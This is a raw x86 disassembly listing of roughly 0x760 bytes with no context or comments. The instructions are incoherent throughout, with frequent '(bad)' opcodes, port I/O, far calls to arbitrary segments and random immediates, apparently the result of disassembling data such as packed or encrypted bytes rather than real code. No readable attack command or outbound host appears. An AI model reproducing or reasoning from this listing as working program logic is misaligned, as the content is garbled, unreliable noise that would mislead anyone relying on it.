  41ee52:	leave  
  41ee53:	inc    ebx
  41ee54:	cld    
  41ee55:	cmc    
  41ee56:	xchg   edi,eax
  41ee57:	mov    DWORD PTR [edx-0x8],ebp
  41ee5a:	iret   
  41ee5b:	pop    ds
  41ee5c:	xor    eax,0x27162373
  41ee61:	mov    ds:0x7869f023,al
  41ee66:	jno    0x41ee86
  41ee68:	jns    0x41edf0
  41ee6a:	cdq    
  41ee6b:	ss out dx,al
  41ee6d:	add    ah,bh
  41ee6f:	fnstsw WORD PTR [eax-0x15aae5dc]
  41ee75:	dec    esp
  41ee76:	imul   ebp,DWORD PTR ds:0xce539259,0x77bf76cf
  41ee80:	test   DWORD PTR [esi+0x610df1b0],ebx
  41ee86:	cmp    bl,BYTE PTR [ecx+ebp*2]
  41ee89:	mov    edi,gs
  41ee8b:	and    bl,BYTE PTR [esi-0x45]
  41ee8e:	adc    eax,edi
  41ee90:	cwde   
  41ee91:	loop   0x41ee2b
  41ee93:	daa    
  41ee94:	or     eax,0x89e4675e
  41ee99:	lahf   
  41ee9a:	mov    bl,0xd7
  41ee9c:	repz push ebp
  41ee9e:	test   ebp,ecx
  41eea0:	call   0x5e41:0x4415a445
  41eea7:	rcr    eax,0x98
  41eeaa:	push   es
  41eeab:	pop    eax
  41eeac:	loope  0x41ee3c
  41eeae:	push   ss
  41eeaf:	scas   eax,DWORD PTR es:[edi]
  41eeb0:	out    dx,al
  41eeb1:	(bad)  
  41eeb2:	in     eax,dx
  41eeb3:	xchg   edx,eax
  41eeb4:	push   ebx
  41eeb5:	in     eax,0x98
  41eeb7:	mov    ebx,0x9d3e9195
  41eebc:	les    esp,FWORD PTR [eax]
  41eebe:	jmp    0xf2c4:0x1fd0ac5c
  41eec5:	ret    
  41eec6:	shl    BYTE PTR [eax-0x2],cl
  41eec9:	or     al,0x14
  41eecb:	iret   
  41eecc:	fcmovb st,st(1)
  41eece:	stos   DWORD PTR es:[edi],eax
  41eecf:	mul    BYTE PTR [ebx+0x14]
  41eed2:	mov    cs,eax
  41eed4:	imul   eax,edi,0xffffff91
  41eed7:	fldenv [edi+0x7d]
  41eeda:	dec    DWORD PTR [esi+edi*2]
  41eedd:	inc    ebx
  41eede:	push   es
  41eedf:	das    
  41eee0:	jo     0x41ef59
  41eee2:	mov    al,0x61
  41eee4:	xor    dh,BYTE PTR [ebx*2+0x1cb16ba3]
  41eeeb:	aas    
  41eeec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eeed:	iret   
  41eeee:	int3   
  41eeef:	and    DWORD PTR [ebx+0x5646b3dc],ecx
  41eef5:	and    al,0xcf
  41eef7:	push   cs
  41eef8:	rcr    DWORD PTR [esi],0xbe
  41eefb:	jb     0x41ef4a
  41eefd:	xor    BYTE PTR [ebx-0xd2cc3bb],dh
  41ef03:	pop    ds
  41ef04:	mov    esp,0xc5871cf7
  41ef09:	sbb    ecx,edx
  41ef0b:	(bad)  [edi-0x2db099f1]
  41ef11:	jb     0x41ef0b
  41ef13:	cwde   
  41ef14:	(bad)
  41ef17:	cmp    DWORD PTR [ebx-0x5e],ecx
  41ef1a:	pusha  
  41ef1b:	sub    bh,BYTE PTR ds:[esi+eax*1+0x1e015a6e]
  41ef23:	sub    bh,BYTE PTR [edi-0x579559d5]
  41ef29:	sub    eax,edx
  41ef2b:	jns    0x41eead
  41ef2d:	jne    0x41ef1f
  41ef2f:	inc    ecx
  41ef30:	div    BYTE PTR [esi]
  41ef32:	mov    edx,0x1a93b94a
  41ef37:	call   FWORD PTR [esi-0x1b]
  41ef3a:	inc    edi
  41ef3b:	push   edi
  41ef3c:	in     al,dx
  41ef3d:	xchg   ebp,eax
  41ef3e:	imul   esp,eax,0x51
  41ef41:	add    DWORD PTR [ebp+0x60ab2259],ecx
  41ef47:	scas   al,BYTE PTR es:[edi]
  41ef48:	sbb    ebx,DWORD PTR [edx]
  41ef4a:	dec    edi
  41ef4b:	aas    
  41ef4c:	cli    
  41ef4d:	mov    ds:0xf80f2a5e,al
  41ef52:	dec    ebx
  41ef53:	int3   
  41ef54:	pop    edi
  41ef55:	js     0x41efbd
  41ef57:	mov    al,0xf
  41ef59:	loop   0x41eeec
  41ef5b:	ins    BYTE PTR es:[edi],dx
  41ef5c:	push   ss
  41ef5d:	push   0x78
  41ef5f:	xchg   ebp,eax
  41ef60:	cdq    
  41ef61:	adc    eax,0x7b4d63e4
  41ef66:	das    
  41ef67:	iret   
  41ef68:	push   ds
  41ef69:	cld    
  41ef6a:	xor    esp,DWORD PTR ds:0x2a188db8
  41ef70:	mov    al,ds:0x43364870
  41ef75:	and    BYTE PTR gs:[ebx+0x629d9b7a],cl
  41ef7c:	jg     0x41ef82
  41ef7e:	in     al,dx
  41ef7f:	push   ds
  41ef80:	ror    BYTE PTR [edi],1
  41ef82:	shl    dh,1
  41ef84:	push   es
  41ef85:	adc    al,0x1d
  41ef87:	test   DWORD PTR [edi-0x7],0x7eb64b63
  41ef8e:	mov    edi,0xf3a5991c
  41ef93:	sti    
  41ef94:	xchg   ecx,eax
  41ef95:	call   0x9206:0x9d076e92
  41ef9c:	lods   eax,DWORD PTR ds:[esi]
  41ef9d:	pop    edx
  41ef9e:	gs mov ecx,0xca7961c3
  41efa4:	mov    fs,ebx
  41efa6:	mov    eax,ds:0xae0909a7
  41efab:	pop    edx
  41efac:	scas   eax,DWORD PTR es:[edi]
  41efad:	xlat   BYTE PTR ds:[ebx]
  41efae:	pop    ebp
  41efaf:	and    cl,BYTE PTR [esi+0x7457fa7f]
  41efb5:	sub    BYTE PTR [eax+edx*8-0x6e67c2c1],dl
  41efbc:	push   0xffffffe2
  41efbe:	push   ebp
  41efbf:	sbb    edi,ebx
  41efc1:	mov    al,ds:0x4cbff122
  41efc6:	pop    ds
  41efc7:	pop    edx
  41efc8:	pop    ss
  41efc9:	add    eax,0xaaf1cdaa
  41efce:	test   al,bh
  41efd0:	inc    ecx
  41efd1:	es push eax
  41efd3:	inc    edi
  41efd4:	cmp    al,0xa2
  41efd6:	cld    
  41efd7:	test   DWORD PTR [esi+ebp*1],eax
  41efda:	pop    ss
  41efdb:	repz pushf 
  41efdd:	xor    DWORD PTR [eax+esi*2],esi
  41efe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efe1:	enter  0xec80,0x17
  41efe5:	stos   BYTE PTR es:[edi],al
  41efe6:	push   eax
  41efe7:	enter  0x609e,0x60
  41efeb:	jg     0x41ef88
  41efed:	mov    DWORD PTR [edi],esp
  41efef:	pop    esi
  41eff0:	cmc    
  41eff1:	xchg   esi,eax
  41eff2:	xchg   ecx,eax
  41eff3:	(bad)  
  41eff4:	cmp    al,0x64
  41eff6:	pushf  
  41eff7:	pop    ebx
  41eff8:	add    ecx,ecx
  41effa:	adc    al,0xc4
  41effc:	fdiv   st,st(3)
  41effe:	adc    BYTE PTR ds:0xd4dfc3a0,dh
  41f004:	or     edx,DWORD PTR [ecx+0x22309d5d]
  41f00a:	daa    
  41f00b:	mov    bl,0x14
  41f00d:	retf   0x1084
  41f010:	les    eax,FWORD PTR [ecx-0x74]
  41f013:	mov    ebx,0xb27e4b91
  41f018:	hlt    
  41f019:	sbb    BYTE PTR [ebx+0x40],al
  41f01c:	adc    eax,0x4b27e1e2
  41f021:	aas    
  41f022:	mov    DWORD PTR [edx-0x61],0xda9359f8
  41f029:	xor    ah,dh
  41f02b:	pop    esi
  41f02c:	in     al,dx
  41f02d:	add    ch,BYTE PTR [esi-0x206f23c1]
  41f033:	cld    
  41f034:	cwde   
  41f035:	int3   
  41f036:	pop    edx
  41f037:	test   BYTE PTR [esi-0x7a],dh
  41f03a:	call   0x92f8:0x18a2766d
  41f041:	js     0x41efde
  41f043:	adc    al,0xc4
  41f045:	clc    
  41f046:	int3   
  41f047:	push   edx
  41f048:	aas    
  41f049:	xchg   DWORD PTR [ebx],ebx
  41f04b:	dec    edx
  41f04c:	scas   eax,DWORD PTR es:[edi]
  41f04d:	xor    ah,bh
  41f04f:	imul   edx,eax,0x6bc23ea5
  41f055:	jo     0x41f09c
  41f057:	push   0x4d
  41f059:	inc    ebp
  41f05a:	pop    ss
  41f05b:	imul   DWORD PTR [ecx]
  41f05d:	pop    ebp
  41f05e:	and    BYTE PTR [ecx],dl
  41f060:	lea    edx,[edi+ecx*2]
  41f063:	call   0x730acf46
  41f068:	push   edx
  41f069:	ds es ins BYTE PTR es:[edi],dx
  41f06c:	pop    esp
  41f06d:	cmp    BYTE PTR [ebp+ecx*8+0x7ded006b],ah
  41f074:	or     BYTE PTR [esi-0x7b22443f],0x7b
  41f07b:	push   eax
  41f07c:	mov    al,0x48
  41f07e:	dec    BYTE PTR [edi-0x49]
  41f081:	add    ah,BYTE PTR [edi-0x28]
  41f084:	jmp    0xb465:0xb7fddf9e
  41f08b:	mov    ch,0x2b
  41f08d:	loopne 0x41f017
  41f08f:	mov    ecx,0xbb7e0a41
  41f094:	pop    ss
  41f095:	out    dx,eax
  41f096:	fnstenv [eax]
  41f098:	cs push es
  41f09a:	or     ecx,esp
  41f09c:	cli    
  41f09d:	out    dx,al
  41f09e:	xor    DWORD PTR [edx],ebx
  41f0a0:	ja     0x41f0bd
  41f0a2:	xor    DWORD PTR [edi+0x412f07fc],0x3d
  41f0a9:	push   0x86b4149f
  41f0ae:	push   esp
  41f0af:	mov    ds:0xd8f1d879,al
  41f0b4:	(bad)  
  41f0b5:	inc    edx
  41f0b6:	aas    
  41f0b7:	rcl    BYTE PTR [eax],cl
  41f0b9:	inc    edi
  41f0ba:	xchg   ebp,eax
  41f0bb:	inc    edi
  41f0bc:	or     eax,0x2a93b442
  41f0c1:	stos   BYTE PTR es:[edi],al
  41f0c2:	sub    edi,ecx
  41f0c4:	push   cs
  41f0c5:	and    BYTE PTR [edi+eax*8-0x274ccf3f],al
  41f0cc:	in     eax,0x4c
  41f0ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0cf:	xchg   ebp,eax
  41f0d0:	js     0x41f0d3
  41f0d2:	pop    eax
  41f0d3:	in     al,dx
  41f0d4:	xor    edi,ebp
  41f0d6:	jge    0x41f05e
  41f0d8:	lds    ecx,FWORD PTR [ebp+0x14038933]
  41f0de:	dec    edi
  41f0df:	fwait
  41f0e0:	add    BYTE PTR [esi-0x44],dl
  41f0e3:	sti    
  41f0e4:	push   ebx
  41f0e5:	int3   
  41f0e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0e7:	shl    BYTE PTR [ebx],cl
  41f0e9:	punpckhbw mm7,QWORD PTR [esi]
  41f0ec:	push   ds
  41f0ed:	sub    BYTE PTR [ebp+0x64f4a69a],al
  41f0f3:	fdivr  DWORD PTR [ecx]
  41f0f5:	idiv   DWORD PTR [eax*8-0x680df61b]
  41f0fc:	cmp    ebp,0x52d8d53d
  41f102:	or     bl,BYTE PTR [edx-0x22927a8f]
  41f108:	mov    edx,0x8ac2b9df
  41f10d:	push   ebp
  41f10e:	rol    DWORD PTR [edi+0x44d9df2a],0x1a
  41f115:	inc    eax
  41f116:	add    al,0x1
  41f118:	jge    0x41f0d1
  41f11a:	hlt    
  41f11b:	imul   ebx,DWORD PTR [ebp-0x26],0xffffff81
  41f11f:	xor    al,0xa8
  41f121:	mov    ebp,0x2b17dea3
  41f126:	mov    eax,ds:0x9710da93
  41f12b:	aaa    
  41f12c:	xor    al,0xa8
  41f12e:	outs   dx,DWORD PTR ds:[esi]
  41f12f:	in     eax,0x6a
  41f131:	or     eax,0xbc288aca
  41f136:	xor    DWORD PTR [ebx-0x7c],0xffffff9d
  41f13a:	pop    ds
  41f13b:	mov    ebx,0xc0fe220d
  41f140:	arpl   WORD PTR [ecx-0xe],bx
  41f143:	lea    ecx,[eax+0x51]
  41f146:	jno    0x41f0d2
  41f148:	or     BYTE PTR [ebx-0x69],al
  41f14b:	mov    bh,0x73
  41f14d:	cld    
  41f14e:	dec    ebx
  41f14f:	call   0x22289ea3
  41f154:	scas   al,BYTE PTR es:[edi]
  41f155:	mov    ?,WORD PTR [eax-0x51]
  41f158:	push   eax
  41f159:	mov    dh,0x3b
  41f15b:	fdivr  st,st(2)
  41f15d:	sub    DWORD PTR [eax+edi*4],edx
  41f160:	fwait
  41f161:	xchg   edx,eax
  41f162:	dec    esp
  41f163:	xchg   DWORD PTR [esi+0xb],edi
  41f166:	sbb    DWORD PTR [ebx],eax
  41f168:	sbb    ecx,DWORD PTR [ecx]
  41f16a:	into   
  41f16b:	popa   
  41f16c:	ss push cs
  41f16e:	pusha  
  41f16f:	loopne 0x41f100
  41f171:	push   edx
  41f172:	dec    eax
  41f173:	mov    dh,al
  41f175:	or     ecx,DWORD PTR [ebp+0x38]
  41f178:	xor    eax,0x58e442fd
  41f17d:	shl    DWORD PTR [ebx],1
  41f17f:	sbb    BYTE PTR [ecx],dl
  41f181:	imul   esp,DWORD PTR [eax-0xa],0x4dc3aaf3
  41f188:	jle    0x41f17d
  41f18a:	push   ebp
  41f18b:	mov    cl,0x3f
  41f18d:	mov    ch,0x7d
  41f18f:	lahf   
  41f190:	pop    eax
  41f191:	inc    eax
  41f192:	out    dx,eax
  41f193:	cmp    DWORD PTR [edx],ebx
  41f195:	xor    ah,BYTE PTR [edx-0x13]
  41f198:	scas   eax,DWORD PTR es:[edi]
  41f199:	sub    eax,0x846d137f
  41f19e:	das    
  41f19f:	cmp    BYTE PTR [ebp-0x5cdc32da],cl
  41f1a5:	call   0xa90385da
  41f1aa:	dec    ebp
  41f1ab:	ja     0x41f13e
  41f1ad:	or     ebx,ecx
  41f1af:	push   eax
  41f1b0:	or     al,0x61
  41f1b2:	push   eax
  41f1b3:	xor    BYTE PTR [edx-0x2b],ah
  41f1b6:	mov    bl,0x30
  41f1b8:	jae    0x41f1ec
  41f1ba:	push   edx
  41f1bb:	xor    al,0x10
  41f1bd:	inc    esp
  41f1be:	adc    eax,0xaf7b9c8c
  41f1c3:	sbb    bh,al
  41f1c5:	daa    
  41f1c6:	jo     0x41f203
  41f1c8:	call   0x76aa:0xbffb2508
  41f1cf:	pop    es
  41f1d0:	test   ebp,0x7992f3f1
  41f1d6:	pop    esi
  41f1d7:	int    0xbc
  41f1d9:	jp     0x41f231
  41f1db:	fnstsw WORD PTR [ebp+edi*2-0x57]
  41f1df:	scas   eax,DWORD PTR es:[edi]
  41f1e0:	xchg   esi,eax
  41f1e1:	fstp   DWORD PTR [eax-0x3910e846]
  41f1e7:	(bad)  
  41f1e8:	lods   al,BYTE PTR ds:[esi]
  41f1e9:	mov    cl,0x8b
  41f1eb:	repnz into 
  41f1ed:	mov    ds:0xda9d763c,al
  41f1f2:	lahf   
  41f1f3:	mov    ecx,fs
  41f1f5:	xor    eax,0xd4aa48c9
  41f1fa:	sbb    esp,DWORD PTR [ecx-0x2b]
  41f1fd:	push   0x311104a5
  41f202:	pop    ebp
  41f203:	mov    ch,0xa3
  41f205:	iret   
  41f206:	test   al,0xb
  41f208:	push   esi
  41f209:	jbe    0x41f196
  41f20b:	mov    edi,0x99ec2c24
  41f210:	push   0x9a719f6a
  41f215:	add    al,0xba
  41f217:	push   eax
  41f218:	stos   BYTE PTR es:[edi],al
  41f219:	xchg   ecx,eax
  41f21a:	pop    es
  41f21b:	test   DWORD PTR [ebx+0x5167f8a5],edx
  41f221:	adc    al,0x25
  41f223:	push   es
  41f224:	mov    eax,ds:0x14c5a62b
  41f229:	mov    ecx,0x156238c9
  41f22e:	xchg   ecx,edx
  41f230:	xor    al,0xd7
  41f232:	jbe    0x41f259
  41f234:	lods   eax,DWORD PTR ds:[esi]
  41f235:	arpl   WORD PTR [ebp+0x70be1974],dx
  41f23b:	(bad)  
  41f23c:	cli    
  41f23d:	mov    ah,BYTE PTR ds:0xce22cdf1
  41f243:	push   ds
  41f244:	inc    edi
  41f245:	mov    edi,0xa97f0ad1
  41f24a:	sbb    al,0x25
  41f24c:	and    DWORD PTR [esi+0x223fc2e5],ebx
  41f252:	(bad)  
  41f253:	stos   DWORD PTR es:[edi],eax
  41f254:	dec    ebx
  41f255:	mov    BYTE PTR [edx+0x33dee960],ch
  41f25b:	mov    eax,ds:0x8106f3d4
  41f260:	sub    edi,esp
  41f262:	adc    BYTE PTR [edi],bl
  41f264:	sub    cl,bh
  41f266:	or     al,cl
  41f268:	mov    eax,0xaf221f1d
  41f26d:	shr    BYTE PTR [ebp+0xd],cl
  41f270:	sub    BYTE PTR [ebp+0x6c],dh
  41f273:	fcom   QWORD PTR [edi]
  41f275:	xor    ebp,esi
  41f277:	or     BYTE PTR [ebx+0xeaee696],dh
  41f27d:	xor    DWORD PTR [ebp-0x67],ebx
  41f280:	je     0x41f211
  41f282:	jecxz  0x41f2d3
  41f284:	cli    
  41f285:	add    edx,eax
  41f287:	in     eax,dx
  41f288:	xchg   ebp,eax
  41f289:	cmp    eax,0x9aa6c149
  41f28e:	jmp    0x41f2b8
  41f290:	jge    0x41f21e
  41f292:	in     eax,0x1e
  41f294:	ds sub al,0x4c
  41f297:	les    ecx,FWORD PTR [esi]
  41f299:	call   0x179ba8e3
  41f29e:	push   ecx
  41f29f:	mov    ebx,0x72003287
  41f2a4:	sti    
  41f2a5:	add    cl,BYTE PTR [ebx+0x39070e3b]
  41f2ab:	fiadd  WORD PTR [ebp-0x7e]
  41f2ae:	ins    BYTE PTR es:[edi],dx
  41f2af:	fwait
  41f2b0:	jmp    0xab05cc4d
  41f2b5:	sbb    bh,ah
  41f2b7:	xor    ch,BYTE PTR [eax+0x26ed6d81]
  41f2bd:	retf   0x1151
  41f2c0:	int3   
  41f2c1:	pusha  
  41f2c2:	leave  
  41f2c3:	fisttp QWORD PTR [ecx+0x2c]
  41f2c6:	stos   BYTE PTR es:[edi],al
  41f2c7:	clc    
  41f2c8:	inc    ecx
  41f2c9:	and    al,0xa4
  41f2cb:	jecxz  0x41f2f5
  41f2cd:	dec    ecx
  41f2ce:	fcomip st,st(4)
  41f2d0:	sbb    DWORD PTR [edx-0x3b],ebp
  41f2d3:	cdq    
  41f2d4:	imul   esp,DWORD PTR [edx],0xffffff95
  41f2d7:	or     DWORD PTR [ecx-0x6e],esp
  41f2da:	xor    BYTE PTR [edi-0x18],0x98
  41f2de:	outs   dx,DWORD PTR ds:[esi]
  41f2df:	cld    
  41f2e0:	imul   edx,DWORD PTR [eax+0x75107f36],0xb2b81dc5
  41f2ea:	push   ss
  41f2eb:	es enter 0xb65d,0x25
  41f2f0:	repz jecxz 0x41f2c6
  41f2f3:	cmc    
  41f2f4:	fwait
  41f2f5:	adc    eax,DWORD PTR [eax+ebp*2-0x7e5b413c]
  41f2fc:	call   0x84a6:0x1d00bae1
  41f303:	gs ins DWORD PTR es:[edi],dx
  41f305:	iret   
  41f306:	xor    al,0x7c
  41f308:	aas    
  41f309:	cmp    eax,DWORD PTR [edi+ecx*4]
  41f30c:	push   0x5b
  41f30e:	leave  
  41f30f:	iret   
  41f310:	push   ds
  41f311:	pop    ecx
  41f312:	iret   
  41f313:	mov    edx,0xc2497ab3
  41f318:	jmp    0x41f2ad
  41f31a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f31b:	leave  
  41f31c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f31d:	lds    edx,FWORD PTR [ecx+0x37]
  41f320:	sub    bh,bh
  41f322:	pop    eax
  41f323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f324:	jge    0x41f2f4
  41f326:	in     eax,dx
  41f327:	and    BYTE PTR [edi],0xd1
  41f32a:	popf   
  41f32b:	mov    cl,ch
  41f32d:	xor    al,0x26
  41f32f:	mov    edi,0x461b59bc
  41f334:	jl     0x41f382
  41f336:	outs   dx,BYTE PTR ds:[esi]
  41f337:	push   esi
  41f338:	cmc    
  41f339:	push   ecx
  41f33a:	inc    ebp
  41f33b:	xchg   ebx,eax
  41f33c:	xchg   ebp,eax
  41f33d:	(bad)  
  41f33e:	out    0xd7,al
  41f340:	mov    ebp,0xd24d1a5b
  41f345:	call   0xb8ed:0x1fb1db31
  41f34c:	dec    ebp
  41f34d:	mov    bl,bh
  41f34f:	in     al,dx
  41f350:	push   esi
  41f351:	into   
  41f352:	cli    
  41f353:	dec    edi
  41f354:	loop   0x41f327
  41f356:	ror    BYTE PTR [edi],1
  41f358:	aam    0xf7
  41f35a:	leave  
  41f35b:	jbe    0x41f3b7
  41f35d:	push   ss
  41f35e:	test   DWORD PTR [eax+0x63a3f99a],esi
  41f364:	cmp    dl,BYTE PTR [edx-0x11fddc2]
  41f36a:	xor    ah,dl
  41f36c:	xchg   esp,eax
  41f36d:	and    al,BYTE PTR [edi+ecx*4+0xa]
  41f371:	or     al,0xdf
  41f373:	shl    BYTE PTR [edx+0x2fcf6ae6],1
  41f379:	mov    dh,cl
  41f37b:	loop   0x41f318
  41f37d:	pop    ecx
  41f37e:	jne    0x41f32c
  41f380:	pop    DWORD PTR [ebx-0x1ad5b0e0]
  41f386:	popa   
  41f387:	pop    esp
  41f388:	ret    0x96a5
  41f38b:	cmp    DWORD PTR [eax+0x70],ecx
  41f38e:	scas   al,BYTE PTR es:[edi]
  41f38f:	push   esp
  41f390:	in     al,0x3c
  41f392:	xchg   esi,eax
  41f393:	push   0xffffff97
  41f395:	test   BYTE PTR [edx],al
  41f397:	stos   DWORD PTR es:[edi],eax
  41f398:	into   
  41f399:	pop    eax
  41f39a:	dec    edx
  41f39b:	fdiv   QWORD PTR [esi+0x2f9d5aea]
  41f3a1:	mov    eax,ds:0x5f69a539
  41f3a6:	cmp    al,0xc3
  41f3a8:	stos   BYTE PTR es:[edi],al
  41f3a9:	rol    ebp,1
  41f3ab:	ret    0x142d
  41f3ae:	cmp    eax,0x8e8c192c
  41f3b3:	jno    0x41f3fa
  41f3b5:	fild   WORD PTR [ebx]
  41f3b7:	or     al,0x72
  41f3b9:	outs   dx,DWORD PTR ds:[esi]
  41f3ba:	xchg   BYTE PTR [eax+0x24],ah
  41f3bd:	inc    ebp
  41f3be:	or     al,0xc2
  41f3c0:	gs aad 0xdf
  41f3c3:	sbb    ebp,DWORD PTR [ebx-0x20]
  41f3c6:	jbe    0x41f37c
  41f3c8:	inc    eax
  41f3c9:	cmc    
  41f3ca:	ror    esi,cl
  41f3cc:	or     al,0xb4
  41f3ce:	or     ebp,0x2de16290
  41f3d4:	call   0xc31fab1a
  41f3d9:	sub    DWORD PTR [eax+0x12],eax
  41f3dc:	test   al,0x26
  41f3de:	jmp    0x7e623abd
  41f3e3:	push   ebx
  41f3e4:	adc    dl,BYTE PTR [edx]
  41f3e6:	mov    dh,BYTE PTR [ebx]
  41f3e8:	lea    eax,[edx-0x3077b82]
  41f3ee:	and    edi,DWORD PTR [edi+0x38a355a1]
  41f3f4:	fcmovne st,st(3)
  41f3f6:	xchg   ebx,eax
  41f3f7:	xlat   BYTE PTR ds:[ebx]
  41f3f8:	inc    eax
  41f3f9:	cld    
  41f3fa:	(bad)
  41f3fe:	lock push ds
  41f400:	into   
  41f401:	loop   0x41f38b
  41f403:	jp     0x41f3f1
  41f405:	push   ebp
  41f406:	jns    0x41f418
  41f408:	je     0x41f3ce
  41f40a:	mov    bl,0x27
  41f40c:	ret    
  41f40d:	fld    DWORD PTR [eax+0x9]
  41f410:	es cs sub eax,0xa5f105b6
  41f417:	jo     0x41f3d8
  41f419:	std    
  41f41a:	fnstenv [ebx-0x7b]
  41f41d:	lahf   
  41f41e:	in     al,0x4
  41f420:	push   ds
  41f421:	cmp    al,0x99
  41f423:	scas   eax,DWORD PTR es:[edi]
  41f424:	sbb    al,0xb7
  41f426:	inc    eax
  41f427:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f428:	adc    ebp,edi
  41f42a:	sahf   
  41f42b:	out    dx,eax
  41f42c:	pusha  
  41f42d:	mov    ds:0xd7fde9e1,al
  41f432:	(bad)  
  41f433:	or     esi,eax
  41f435:	retf   
  41f436:	xchg   BYTE PTR ds:0xa608e9a7,al
  41f43c:	sub    al,BYTE PTR [ecx+0x6d767610]
  41f442:	pop    ss
  41f443:	shl    BYTE PTR [ecx-0x56bfd45],cl
  41f449:	and    BYTE PTR [esi-0x20],ch
  41f44c:	mov    bh,0xc
  41f44e:	adc    edx,edi
  41f450:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f452:	icebp  
  41f453:	xchg   ebx,eax
  41f454:	cwde   
  41f455:	shl    ch,cl
  41f457:	shl    DWORD PTR [eax],1
  41f459:	mov    al,0x7c
  41f45b:	out    dx,al
  41f45c:	inc    edx
  41f45d:	cmp    eax,0x9465d58
  41f462:	jmp    0xc035:0xee4eb1e2
  41f469:	and    al,0x7d
  41f46b:	test   eax,0xc05ffba9
  41f470:	jecxz  0x41f439
  41f472:	mov    ds:0x30e853d2,eax
  41f477:	mov    eax,0x180e2424
  41f47c:	add    DWORD PTR [eax+0x31],esp
  41f47f:	jecxz  0x41f40f
  41f481:	and    bh,dh
  41f483:	push   cs
  41f484:	push   0x38
  41f486:	arpl   WORD PTR gs:[ecx-0x477d4143],cx
  41f48d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f48e:	or     al,0x57
  41f490:	sbb    BYTE PTR [edx],al
  41f492:	inc    edx
  41f493:	sbb    dl,BYTE PTR [edx]
  41f495:	lea    ecx,[ebp+0x1d]
  41f498:	jl     0x41f509
  41f49a:	sbb    eax,0xfb285595
  41f49f:	push   ebx
  41f4a0:	xlat   BYTE PTR ds:[ebx]
  41f4a1:	adc    al,0x93
  41f4a3:	pop    ebp
  41f4a4:	adc    al,0xf4
  41f4a6:	mov    edi,0xd14ecb93
  41f4ab:	sbb    eax,0x7c2fc880
  41f4b0:	xlat   BYTE PTR ds:[ebx]
  41f4b1:	outs   dx,DWORD PTR ds:[esi]
  41f4b2:	(bad)  
  41f4b3:	scas   al,BYTE PTR es:[edi]
  41f4b4:	adc    esp,DWORD PTR [edi-0x80]
  41f4b7:	jmp    0x41f51e
  41f4b9:	popf   
  41f4ba:	dec    ebp
  41f4bb:	cmc    
  41f4bc:	xchg   BYTE PTR [ebx-0x6f591670],al
  41f4c2:	push   eax
  41f4c3:	scas   eax,DWORD PTR es:[edi]
  41f4c4:	mov    BYTE PTR [edx],dl
  41f4c6:	ds jmp 0x317f:0xe0ae763
  41f4ce:	pop    eax
  41f4cf:	push   ebx
  41f4d0:	inc    edx
  41f4d1:	jns    0x41f54c
  41f4d3:	pop    ds
  41f4d4:	jl     0x41f525
  41f4d6:	push   cs
  41f4d7:	lods   al,BYTE PTR ds:[esi]
  41f4d8:	push   ecx
  41f4d9:	jmp    0x8bf021da
  41f4de:	sbb    al,0x91
  41f4e0:	and    ecx,DWORD PTR [edi-0x4d]
  41f4e3:	or     BYTE PTR [bp+si+0x75f2],0x48
  41f4e9:	add    edx,DWORD PTR [esi+0x7c]
  41f4ec:	aas    
  41f4ed:	aaa    
  41f4ee:	jns    0x41f507
  41f4f0:	add    DWORD PTR [esi+eax*4-0x37],0x58
  41f4f5:	popa   
  41f4f6:	push   ebx
  41f4f7:	stc    
  41f4f8:	adc    eax,DWORD PTR [edx]
  41f4fa:	jbe    0x41f537
  41f4fc:	push   es
  41f4fd:	pop    es
  41f4fe:	xchg   esi,eax
  41f4ff:	call   0xfe2b862a
  41f504:	xchg   edx,eax
  41f505:	daa    
  41f506:	call   0x2b3c30de
  41f50b:	jmp    0x262cd2b2
  41f510:	ror    DWORD PTR [edx-0x6886382c],1
  41f516:	idiv   BYTE PTR [ebp+0x4de4fa8b]
  41f51c:	and    edx,DWORD PTR [ecx+0x5]
  41f51f:	pop    ds
  41f520:	(bad)  
  41f521:	and    al,0x50
  41f523:	test   eax,0x2b0a6ef2
  41f528:	dec    edx
  41f529:	mov    al,ds:0x5bc39b01
  41f52e:	and    DWORD PTR [esi-0x7c],esi
  41f531:	test   BYTE PTR [ecx],dh
  41f533:	push   ds
  41f534:	add    al,0x5
  41f536:	dec    esi
  41f537:	xor    edi,ebx
  41f539:	add    BYTE PTR [esp+edi*2-0x50a8da07],ch
  41f540:	outs   dx,BYTE PTR ds:[esi]
  41f541:	jmp    0xb5fd0090
  41f546:	or     DWORD PTR [ecx+0x557ebeab],ebp
  41f54c:	jmp    0x41f5b2
  41f54e:	mov    ah,0xfe
  41f550:	enter  0xa699,0x2d
  41f554:	dec    edx
  41f555:	push   eax
  41f556:	test   al,0x19
  41f558:	xchg   ebp,eax
  41f559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f55a:	xlat   BYTE PTR ds:[ebx]
  41f55b:	inc    ebp
  41f55c:	cmp    eax,0xa48035ae
  41f561:	adc    al,0x58
  41f563:	or     eax,0xb7757324
  41f568:	rcr    BYTE PTR [edi+eiz*1],1
  41f56b:	sub    eax,DWORD PTR [ebx]
  41f56d:	bound  ebp,QWORD PTR [esi+eax*2]
  41f570:	sub    BYTE PTR [edx-0x4b8161ab],ch
  41f576:	sbb    bh,BYTE PTR [ebp+0x72803f0a]
  41f57c:	pop    edx
  41f57d:	mov    dl,dh
  41f57f:	rol    DWORD PTR [eax+0x17c31037],cl
  41f585:	outs   dx,BYTE PTR ds:[esi]
  41f586:	jp     0x41f513
  41f588:	loop   0x41f5b8
  41f58a:	gs scas al,BYTE PTR es:[edi]
  41f58c:	into   
  41f58d:	call   0x2535:0xd1eb5d4f
  41f594:	shufps xmm5,XMMWORD PTR [ebx-0x22],0xe8
  41f599:	test   eax,0x6aaa3119
  41f59e:	push   0xcbd74aa1
  41f5a3:	mov    eax,0x16d695e8
  41f5a8:	adc    DWORD PTR [esi-0x1f7a3d05],ecx
  41f5ae:	sbb    cl,BYTE PTR [ebx]
